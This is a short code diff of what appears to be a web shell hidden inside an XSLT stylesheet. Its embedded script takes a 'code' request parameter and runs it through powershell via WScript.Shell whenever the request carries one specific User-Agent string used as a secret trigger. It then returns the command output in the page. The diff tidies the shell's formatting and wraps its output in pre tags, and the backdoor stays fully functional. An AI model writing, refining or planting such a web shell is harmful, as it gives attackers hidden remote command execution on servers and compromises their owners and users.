@@ -18,11 +18,11 @@ string xml=@"<?xml version=""1.0""?><root></root>";string xslt=@"<?xml version='
     var command = Request.Item['code'];
     var useragent = Request.Headers[""User-Agent""].ToString();
     if (useragent == ""Mozilla/6.4 (Windows NT 11.1) Gecko/2010102 Firefox/99.0""){
-    var r = new ActiveXObject(""WScript.Shell"").Exec(""powershell ""+command);
+    var r = new ActiveXObject(""WScript.Shell"").Exec(""powershell "" + command);
     var OutStream = r.StdOut;
     var Str = """";
 
-    while (!OutStream.atEndOfStream) {Str = Str + OutStream.readAll();}
+    while (!OutStream.atEndOfStream) {Str = '<pre>' + Str + OutStream.readAll() + '</pre>';}
     Response.Write(Str);}}]]>
 
 </msxsl:script>
